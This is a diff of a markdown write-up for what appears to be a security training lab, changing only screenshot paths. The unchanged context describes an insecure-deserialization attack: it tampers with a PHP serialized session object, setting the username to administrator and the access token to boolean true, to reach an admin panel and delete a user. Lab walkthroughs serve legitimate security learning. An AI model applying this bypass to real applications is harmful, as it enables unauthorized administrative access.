@@ -11,7 +11,7 @@
 login
 then /my-account page sent to repeater
 
-![screenshot](./images/lab2_account_page_in_repeater.png)
+![screenshot](images/lab2_account_page_in_repeater.jpg)
 
 ### step2
 
@@ -23,12 +23,12 @@ O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bdrsqrhm9pma
 O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
 ```
 
-![screenshot](./images/lab2_decode_encode_token.png)
+![screenshot](images/lab2_decode_encode_token.jpg)
 
 ### step3
 
 use encoded session id
 
-![screenshot](./images/lab2_admin_panel_session_id.png)
+![screenshot](images/lab2_admin_panel_session_id.jpg)
 
 use this session id to delete carlos account and solved the lab
